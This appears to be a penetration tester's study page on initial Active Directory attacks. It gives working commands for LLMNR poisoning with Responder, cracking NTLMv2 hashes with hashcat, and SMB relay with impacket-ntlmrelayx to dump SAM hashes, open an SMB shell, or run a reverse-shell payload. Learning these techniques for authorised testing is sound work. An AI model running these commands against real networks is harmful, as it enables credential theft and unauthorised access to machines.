---
description: The fun part
---

# Attacking AD: Initial Attack Vectors

## Great Resource

{% embed url="https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa" %}

## LLMNR Poisoning

* <mark style="color:yellow;">Link Local Multicast Name Resolution</mark>
* This is a protocol that is used to <mark style="color:yellow;">identify hosts when DNS fails to do so</mark>
* Previously NBT-NS
* The <mark style="color:yellow;">flaw</mark> is that the services utilize a <mark style="color:yellow;">user's username and NTLMv2 when appropriately responded to</mark>

Example:

Victim and Server

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### How to exploit

Step 1: Run Responder

```
sudo responder -I tun0 -rdwv
```

* NOTE: This tool should seriously be the first thing that you run on an engagement
  * Especially during the morning hours when users are authenticating for the first time that day
  * Lunch is also a great time
* You should theoretically receive a hash once an even occurs

Step 2: Wait

Step 3: Obtain hash and proceed to Pass-The-Hash or take offline and crack!

Step 4: Password Cracking

```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

* Run these on your host for fast speeds

Finding Hashcat format:

```
hashcat --help | grep NTLM
```

## SMB Relay

* Instead of cracking hashes gathered by responder, we can relay those hashes to specific machines and potentially gain access

### Requirements

* <mark style="color:yellow;">SMB signing MUST BE DISABLED on the target</mark>
* Relayed user credentials must be admin on machine

### How to Exploit

Step 1: Make sure that <mark style="color:yellow;">SMB and HTTP servers are set to OFF</mark>

Step 2: Run <mark style="color:yellow;">Responder</mark>

```
sudo responder -I tun0 -rdwv
```

* You should see that SMB and HTTP are off

Step 3: Set up your relay -- <mark style="color:yellow;">impacket-ntlmrelayx</mark>

```
impacket-ntlmrelayx -tf targets.txt -smb2support
```

Step 4: Wait for an event to occur

Step 5: Upon success, you will see that a SAM file has been dumped

* SAM is a hash for a password
* We can take these offline and crack them
* Pass-The-Hash is available too

### Interactive SMB Shell

Start Interactive Session:

```
impacket-ntlmrelayx -tf targets.txt -smb2support -i

[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

Connect to Interactive Session:&#x20;

```
nc 127.0.0.1 11000
Type help for a list of commands
# help

# shares
ADMIN$
C$
IPC$
Share

# use C$
# ls

# use ADMIN$
# ls
```

### Execute a Reverse Shell or Meterpreter Listener

* Must generate payload with MSFVENOM!
* Get a shell in Metasploit/multihandler

```
impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe
```

Execute a command:

```
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

You can also use a PowerShell Reverse Shell!

```
```

## Identifying and Discovering Hosts w/ SMB Signing Disabled

* Remember, hosts with SMB signing disabled means that they are susceptible to SMB relay attacks
* NOTE: Servers will by default have SMB signing enabled and required
* NOTE: Clients will by default have SMB signing enabled but not required&#x20;

Nmap Syntax:

```
nmap --script=smb2-security-mode.nse -p445 192.168.10.0/24
```

* Upon running responder and obtaining a network event, you will get a hash
